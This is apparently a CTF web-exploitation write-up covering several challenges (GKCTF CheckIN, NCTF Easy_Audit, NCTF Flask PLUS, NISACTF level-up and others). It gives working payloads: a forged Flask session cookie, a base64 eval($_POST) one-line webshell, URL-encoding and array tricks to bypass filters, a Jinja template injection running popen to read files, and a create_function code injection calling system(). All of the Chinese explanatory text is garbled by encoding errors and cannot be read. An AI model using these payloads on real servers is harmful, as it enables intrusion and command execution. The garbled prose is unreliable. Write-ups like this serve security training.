<p>ä½†æ˜¯åœ¨ä½¿ç”¨è„šæœ¬æ—¶å‡ºç°äº†ä¸€äº›é—®é¢˜å¯¼è‡´ä¸€ç›´æŠ¥é”™ï¼Œè¿™é‡Œé˜è¿°ä¸€ä¸‹ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python flask_session_cookie_manager3.py encode -s &quot;th3f1askisfunny&quot; -t &quot;&#123;&#x27;_fresh&#x27;: True,&#x27;_i</span><br><span class="line">d&#x27;: &#x27;323e553274b92d78b97cec1e6057e2d1e427da85e1e1d30ab94c690b84cea27289a62d7bfece7c28411e7440095785ba82b839cb6355dad9068</span><br><span class="line">bdd3f73b6aac8&#x27;,&#x27;_user_id&#x27;: &#x27;1&#x27;&#125;&quot;</span><br></pre></td></tr></table></figure>

<p>è¦æ³¨æ„çš„æ˜¯è¿™é‡Œçš„Trueä¸èƒ½ä¸ºtrueï¼ŒåŒæ—¶è¦æ³¨æ„ä¸€äº›ç©ºæ ¼ï¼Œå€¼å‰è¦æœ‰ä¸€ä¸ªç©ºæ ¼ã€‚</p>
<p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241202135053653.png" alt="image-20241202135053653"></p>
<p>é”™è¯¯ç¤ºä¾‹å¦‚ä¸Š</p>
<h2 id="GKCTF-2020-CheckIN"><a href="#GKCTF-2020-CheckIN" class="headerlink" title="[GKCTF 2020]CheckIN"></a>[GKCTF 2020]CheckIN</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;title&gt;Check_In&lt;/title&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ClassName</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$code</span> = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$decode</span> = <span class="literal">null</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;code = @<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">x</span>()[<span class="string">&#x27;Ginkgo&#x27;</span>];</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;decode = @<span class="title function_ invoke__">base64_decode</span>( <span class="variable">$this</span>-&gt;code );</span><br><span class="line">                @<span class="title function_ invoke__">Eval</span>(<span class="variable">$this</span>-&gt;decode);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">x</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$_REQUEST</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">ClassName</span>();</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">node4.anna.nssctf.cn:28768?Ginkgo=ZXZhbCgkX1BPU1RbMV0pOw==</span><br></pre></td></tr></table></figure>

<p>æä¸€ä¸ªä¸€å¥è¯æœ¨é©¬å°±å¥½ï¼Œæ”¾å“¥æ–¯æ‹‰ä¸Šé¢</p>
<p>å‘ç°æ‰§è¡Œä¸äº†å‘½ä»¤ï¼Œå­˜åœ¨disable_functionï¼Œå¯ä»¥ç”¨æ’ä»¶æ¥ç»•è¿‡</p>
<p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241202141718720.png" alt="image-20241202141718720"></p>
<h2 id="NCTF-2018-Easy-Audit"><a href="#NCTF-2018-Easy-Audit" class="headerlink" title="[NCTF 2018]Easy_Audit"></a>[NCTF 2018]Easy_Audit</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_REQUEST</span>)&#123;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$_REQUEST</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-zA-Z]/i&#x27;</span>, <span class="variable">$value</span>))   <span class="keyword">die</span>(<span class="string">&#x27;waf..&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SERVER</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/yulige|flag|nctf/i&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>]))  <span class="keyword">die</span>(<span class="string">&#x27;waf..&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;yulige&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!(<span class="title function_ invoke__">substr</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;yulige&#x27;</span>], <span class="number">32</span>) === <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;yulige&#x27;</span>])))&#123;         <span class="comment">//æ—¥çˆ†md5!!!!!!</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;waf..&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/nctfisfun$/&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;nctf&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;nctf&#x27;</span>] !== <span class="string">&#x27;nctfisfun&#x27;</span>)&#123;</span><br><span class="line">            <span class="variable">$getflag</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$getflag</span>) &amp;&amp; <span class="variable">$getflag</span> === <span class="string">&#x27;ccc_liubi&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">die</span>(<span class="string">&#x27;waf..&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>åœ¨è¿™é‡Œé¦–å…ˆå¯¹é¢˜ç›®è¿›è¡Œæ€è·¯è§£æï¼š</p>
<p>è¦ä»¥GETæ–¹æ³•æ¥æ”¶yuligeå‚æ•°ï¼Œä½†æ˜¯ä¼šè¢«è¿‡æ»¤</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(preg_match(&#x27;/yulige|flag|nctf/i&#x27;, $_SERVER[&#x27;QUERY_STRING&#x27;]))  die(&#x27;waf..&#x27;);</span><br></pre></td></tr></table></figure>

<p>$_SERVER[â€˜QUERY_STRINGâ€™]åŒ¹é…çš„æ˜¯é—®å·åçš„å†…å®¹ï¼Œä¸”ä¸ä¼šè¿›è¡Œurlè§£ç ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡urlç¼–ç ç»•è¿‡</p>
<p>ä½†æ˜¯ä¸Šé¢åˆå­˜åœ¨</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if($_REQUEST)&#123;</span><br><span class="line">    foreach ($_REQUEST as $key =&gt; $value) &#123;</span><br><span class="line">        if(preg_match(&#x27;/[a-zA-Z]/i&#x27;, $value))   die(&#x27;waf..&#x27;);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>è¿™ä¼šåŒ¹é…ä½¿å¯¹yuligeçš„ä¼ å‚ä¸èƒ½æœ‰å­—æ¯ï¼Œè¿™å¯ä¸è¡Œå•Šï¼ï¼</p>
<p>ä½†æ˜¯æˆ‘ä»¬å¯ä»¥å‘ç°è¿™åªæ˜¯$_REQUESTï¼Œå¦‚æœåŒæ—¶getå’Œpostï¼Œpostä¼˜å…ˆï¼Œä¼šäº§ç”Ÿå˜é‡è¦†ç›–ã€‚</p>
<p>ç„¶åæˆ‘ä»¬éœ€è¦å…³æ³¨çš„å°±æ˜¯è¿™é‡Œçš„å†…å®¹</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;yulige&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!(<span class="title function_ invoke__">substr</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;yulige&#x27;</span>], <span class="number">32</span>) === <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;yulige&#x27;</span>])))&#123;         <span class="comment">//æ—¥çˆ†md5!!!!!!</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;waf..&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/nctfisfun$/&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;nctf&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;nctf&#x27;</span>] !== <span class="string">&#x27;nctfisfun&#x27;</span>)&#123;</span><br><span class="line">            <span class="variable">$getflag</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$getflag</span>) &amp;&amp; <span class="variable">$getflag</span> === <span class="string">&#x27;ccc_liubi&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">die</span>(<span class="string">&#x27;waf..&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>é¦–å…ˆè¦ç»•è¿‡md5çš„æ¯”è¾ƒï¼Œè¦è®©è‡ªå·±çš„å‰32ä½å¼ºç­‰äºè‡ªå·±çš„md5å€¼ï¼Œé‡‡ç”¨æ•°ç»„ç»•è¿‡ã€‚å› ä¸ºéƒ½ä¸ºNULL</p>
<p>ç„¶ååé¢çš„å°±å¤ªç®€å•äº†ï¼Œç»™å‡ºpayloadï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://node4.anna.nssctf.cn:28809/?%79%75%6C%69%67%65[]=123&amp;%6E%63%74%66=nnct%66isfun&amp;%66%6C%61%67=data://text/plain,ccc_liubi</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yulige=123&amp;nctf=1&amp;flag=2</span><br></pre></td></tr></table></figure>





<h2 id="NSSRound-1-Basic-basic-check"><a href="#NSSRound-1-Basic-basic-check" class="headerlink" title="[NSSRound#1 Basic]basic_check"></a>[NSSRound#1 Basic]basic_check</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);<span class="comment">// Welcome to NSSCTF Round#1 Basic, have fun. </span></span><br></pre></td></tr></table></figure>

<p>ä¸€é“å¥‡å¥‡æ€ªæ€ªçš„é¢˜ï¼Œä¹‹å‰æ²¡æœ‰è§è¿‡ï¼Œé™¤äº†è¿™ä¸ªå°±å•¥éƒ½æ²¡æœ‰äº†ï¼Œç›®å½•ä¹Ÿä»€ä¹ˆéƒ½æ‰«ä¸åˆ°ã€‚</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\TY&gt;curl -I -X OPTIONS <span class="string">&quot;node4.anna.nssctf.cn:28934/index.php&quot;</span></span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Date: Mon, 02 Dec 2024 11:09:33 GMT</span><br><span class="line">Server: Apache/2.4.38 (Debian)</span><br><span class="line">DAV: 1,2</span><br><span class="line">DAV: &lt;http://apache.org/dav/propset/fs/1&gt;</span><br><span class="line">MS-Author-Via: DAV</span><br><span class="line">Allow: OPTIONS,GET,HEAD,POST,DELETE,TRACE,PROPFIND,PROPPATCH,COPY,MOVE,PUT,LOCK,UNLOCK</span><br><span class="line">Content-Length: 0</span><br></pre></td></tr></table></figure>

<p><strong><code>-X OPTIONS</code></strong></p>
<p><code>-X OPTIONS</code> æŒ‡å®šäº†è¯·æ±‚çš„æ–¹æ³•ä¸º <code>OPTIONS</code>ï¼Œè¿™æ˜¯ HTTP çš„ä¸€ç§æ–¹æ³•ï¼Œå¸¸ç”¨äºæŸ¥è¯¢æœåŠ¡å™¨æ”¯æŒçš„ HTTP æ–¹æ³•ï¼ˆå¦‚ <code>GET</code>ã€<code>POST</code>ã€<code>PUT</code> ç­‰ï¼‰ã€‚</p>
<p>è¿™æ¡å‘½ä»¤çš„ä½œç”¨æ˜¯å‘ <code>node4.anna.nssctf.cn:28934/index.php</code> å‘é€ä¸€ä¸ª <code>OPTIONS</code> è¯·æ±‚ï¼Œå¹¶æ˜¾ç¤ºå“åº”å¤´ã€‚</p>
<p><strong>å†è¯´ä¸€ä¸‹PUTã€DELETEè¯·æ±‚ï¼ŒPUTã€DELETEè¯·æ±‚æœ¬èº«æœ€åˆæ˜¯ç”¨æ¥è¿›è¡Œæ–‡ä»¶ç®¡ç†çš„ï¼Œå½“ç„¶è¿™ä¸ªè¯·æ±‚å¦‚æœä¸ºè¿›è¡Œé‰´æƒå¤„ç†çš„è¯å°±ä¼šä»»æ„æ‰§è¡Œä¿®æ”¹å’Œåˆ é™¤ï¼ŒPUTè¯·æ±‚ï¼Œå¦‚æœä¸å­˜åœ¨è¿™ä¸ªè·¯å¾„ä¸‹çš„æ–‡ä»¶ï¼Œå°†ä¼šåˆ›å»ºï¼Œå¦‚æœå­˜åœ¨ï¼Œä¼šæ‰§è¡Œè¦†ç›–æ“ä½œ</strong></p>
<img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241202191229996.png" alt="image-20241202191229996" style="zoom:67%;" />

<img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241202191236455.png" alt="image-20241202191236455" style="zoom: 80%;" />

<p>æ‹¿æäº†</p>
<p>NSSCTF{031e835f-af6a-447d-838d-6d5e5b640e8e}</p>
<h2 id="GDOUCTF-2023-hate-eat-snake"><a href="#GDOUCTF-2023-hate-eat-snake" class="headerlink" title="[GDOUCTF 2023]hate eat snake"></a>[GDOUCTF 2023]hate eat snake</h2><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241202192140294.png" alt="image-20241202192140294" style="zoom:50%;" />

<p>ä¸€é“jsé¢˜ç›®ï¼Œè¿™ç§é¢˜ä¸€èˆ¬ç›´æ¥ç»™äº†flagåœ¨æºç é‡Œï¼Œä½†æ˜¯æˆ‘æ‰¾ä¸åˆ°ã€‚è¿™é‡Œåˆšå¼€å§‹æ˜¯æ‰“ä¸å¼€æºç çš„</p>
<p>è¿™é‡Œå¯ä»¥å³é”®-&gt;æ£€æŸ¥</p>
<p>å…ˆå¤åˆ¶ç½‘é¡µurlï¼Œæ‰“å¼€f12ï¼Œå†è¾“å…¥ç½‘å€æ‰“å¼€ç½‘é¡µï¼Œè¿™æ ·f12å°±ä¼šä¿ç•™</p>
<p><a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E7%81%AB%E7%8B%90%E6%B5%8F%E8%A7%88%E5%99%A8&spm=1001.2101.3001.7020">ç«ç‹æµè§ˆå™¨</a>å³è¾¹çš„ä¸‰æ¨ª-&gt;æ›´å¤šå·¥å…·-&gt;å¼€å‘è€…å·¥å…·ã€‚</p>
<p>ä¸‰ç§æ–¹æ³•æ‰“å¼€f12</p>
<p>æ¥ä¸‹æ¥åˆ†æé¢˜ç›®</p>
<p>è¿™ç§jsçš„ç½‘é¡µï¼Œflagä¸€èˆ¬éƒ½æ˜¯alertç»™ä½ ï¼Œé‚£ä¹ˆæˆ‘ä»¬æ¥ä¸‹æ¥æœä¸€ä¸‹alertå‡½æ•°</p>
<p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241202192401696.png" alt="image-20241202192401696"></p>
<p>ä¸å‡ºæ„å¤–è¿™å°±æ˜¯flagäº†ã€‚å‰é¢æœ‰ä¸ªifæ¯”è¾ƒï¼Œè·Ÿè¿›ä¸€ä¸‹getScore</p>
<p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241202192427751.png" alt="image-20241202192427751"></p>
<p>é‚£ä¹ˆåªè¦è®©è¿™ä¸ªreturnçš„scoreå€¼è¶…çº§å¤§å°±è¡Œï¼Œ84è¡Œæ‰“æ–­ç‚¹ç„¶åç©ºæ ¼è¿è¡Œæ¸¸æˆ</p>
<p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241202192500153.png" alt="image-20241202192500153"></p>
<p>ç„¶åæ¥æ§åˆ¶å°æ”¹scoreçš„å€¼</p>
<p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241202192515347.png" alt="image-20241202192515347"></p>
<p>å›è½¦é‡æ–°è¿è¡Œåalertå‡ºflag</p>
<p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241202192532428.png" alt="image-20241202192532428"></p>
<h2 id="NCTF-2018-Flask-PLUS"><a href="#NCTF-2018-Flask-PLUS" class="headerlink" title="[NCTF 2018]Flask PLUS"></a>[NCTF 2018]Flask PLUS</h2><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241202195010229.png" alt="image-20241202195010229"></p>
<p>è¿™é¢˜æœ¬æ¥æƒ³ç€ç”¨fenjingï¼Œä½†æ˜¯è¿™ç§æ ¼å¼çš„å¥½åƒç”¨ä¸å¤ªäº†fenjing</p>
<p>Auraç»™å‡ºä¸€ä¸ªæ–¹æ³•ï¼š</p>
<blockquote>
<p>å¯ä»¥å…ˆæŠŠé»‘åå•fuzzå‡ºæ¥ï¼Œæœ¬åœ°å¼€ä¸€ä¸ªserverè·‘å‡ºæ¥payloadï¼Œå†æ‹¼ä¸Šå»</p>
</blockquote>
<p>è™½ç„¶ä½†æ˜¯è¿™é“é¢˜æ¯”è¾ƒç®€å•ç›´æ¥æ‰‹åŠ¨äº†ã€‚</p>
<p>è¿™é‡Œç»™å‡ºpayloadï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;lipsum.__globals__[&#x27;o&#x27;&#x27;s&#x27;][&#x27;pop&#x27;&#x27;en&#x27;](&#x27;tac /Th1s_is__F1114g&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>



<h2 id="NISACTF-2022-level-up"><a href="#NISACTF-2022-level-up" class="headerlink" title="[NISACTF 2022]level-up"></a>[NISACTF 2022]level-up</h2><p>ä¸€å…±æœ‰äº”ä¸ªlevelï¼Œç¬¬ä¸€å…³æ˜¯ç›®å½•æ‰«æï¼Œæ‰«å‡ºrobots.txtå³å¯ã€‚</p>
<p>ç¬¬äºŒå…³md5ç¢°æ’ï¼Œç®€å•</p>
<p>ç¬¬ä¸‰å…³sha1ç¢°æ’ï¼Œéƒ½æ˜¯æœ‰ç¬”è®°çš„ï¼Œç®€å•ã€‚</p>
<p>ç¬¬å››å…³çœ‹çœ‹</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">include</span> <span class="string">&quot;str.php&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$str</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$str</span>[<span class="string">&#x27;query&#x27;</span>] == <span class="string">&quot;&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;give me a parameter&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ |_|20|5f|2e|\./&#x27;</span>,<span class="variable">$str</span>[<span class="string">&#x27;query&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;blacklist here&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;NI_SA_&#x27;</span>] === <span class="string">&quot;txw4ever&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="variable">$level5</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;level 4 failed ...&quot;</span>);</span><br><span class="line">    &#125; </span><br></pre></td></tr></table></figure>

<p><code>$_SERVER[&#39;REQUEST_URI&#39;]</code> æ˜¯ä¸€ä¸ª PHP è¶…å…¨å±€å˜é‡ï¼Œè¡¨ç¤ºå½“å‰è¯·æ±‚çš„ URIï¼ˆUniform Resource Identifierï¼‰ã€‚å®ƒæä¾›äº†å®¢æˆ·ç«¯è¯·æ±‚çš„å®Œæ•´ URIï¼ŒåŒ…æ‹¬è·¯å¾„å’ŒæŸ¥è¯¢å­—ç¬¦ä¸²éƒ¨åˆ†ã€‚</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="http://example.com/test/page.php?name=John&age=30">http://example.com/test/page.php?name=John&amp;age=30</a></p>
<p>è¾“å‡º</p>
<p>&#x2F;test&#x2F;page.php?name&#x3D;John&amp;age&#x3D;30</p>
</blockquote>
<p>è€Œä¸‹åˆ’çº¿ç”¨åŠ å·ç»•è¿‡å³å¯ã€‚</p>
<p>æœ€åæ˜¯level5</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//sorry , here is true last level</span></span><br><span class="line"><span class="comment">//^_^</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;str.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[a-z0-9_]*$/isD&#x27;</span>,<span class="variable">$a</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$a</span>(<span class="string">&#x27;&#x27;</span>,<span class="variable">$b</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œå°±è¦ç”¨åˆ°create_function</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">æ³¨é‡Šæ‰create_function()æ ¼å¼åé¢çš„â€™&#125;&#x27;,é˜²æ­¢æŠ¥é”™</span><br><span class="line"></span><br><span class="line">#create_function(â€˜$aâ€™, â€˜echo(â€œhelloâ€);â€™)çš„å®ç°é€»è¾‘å¦‚ä¸‹ï¼š</span><br><span class="line">function niming($a)</span><br><span class="line">&#123;</span><br><span class="line">echo(â€œhelloâ€);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">é¢˜ç›®é‡Œçš„payloadå°±æ˜¯ä¸‹é¢è¿™ä¸ª</span><br><span class="line">function niming()</span><br><span class="line">&#123;</span><br><span class="line">&#125;system(â€˜cat /flagâ€™);//&#125;</span><br></pre></td></tr></table></figure>

<p>å› æ­¤è¿™é‡Œçš„payloadä¸º</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a=\create_function&amp;b=&#125;system(&#x27;ls /&#x27;);//</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œçš„åæ–œæ æ˜¯ç»•è¿‡preg_matchï¼ŒåŒæ—¶è½¬ä¹‰cï¼Œä¸ä¼šå¯¹å‡½æ•°é€ æˆå½±å“ã€‚</p>
<h2 id="HUBUCTF-2022-æ–°ç”Ÿèµ›-Calculate"><a href="#HUBUCTF-2022-æ–°ç”Ÿèµ›-Calculate" class="headerlink" title="[HUBUCTF 2022 æ–°ç”Ÿèµ›]Calculate"></a>[HUBUCTF 2022 æ–°ç”Ÿèµ›]Calculate</h2><p>ä¸€é“è®¡ç®—é¢˜ï¼Œç”¨pythonè§£é¢˜</p>
<p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241203142059441.png" alt="image-20241203142059441"></p>
